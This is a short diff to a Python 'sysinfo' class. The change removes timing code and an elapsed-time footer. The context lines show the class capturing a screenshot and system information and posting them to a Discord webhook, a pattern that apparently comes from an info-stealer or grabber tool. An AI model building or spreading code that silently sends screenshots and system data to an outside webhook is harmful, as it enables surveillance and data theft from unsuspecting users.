@@ -14,8 +14,6 @@ import time
 
 class sysinfo():
     def __init__(self, webhook: str) -> None:
-        start = time.perf_counter()
-
         webhook = SyncWebhook.from_url(webhook)
         embed = Embed(title="System Information", color=0x000000)
 
@@ -53,10 +51,6 @@ class sysinfo():
         )
         image.save("screenshot.png")
         embed.set_image(url="attachment://screenshot.png")
-
-        embed.set_footer(
-            text=f"Elapsed time: {time.perf_counter() - start:.2f}s"
-        )
 
         try:
             webhook.send(
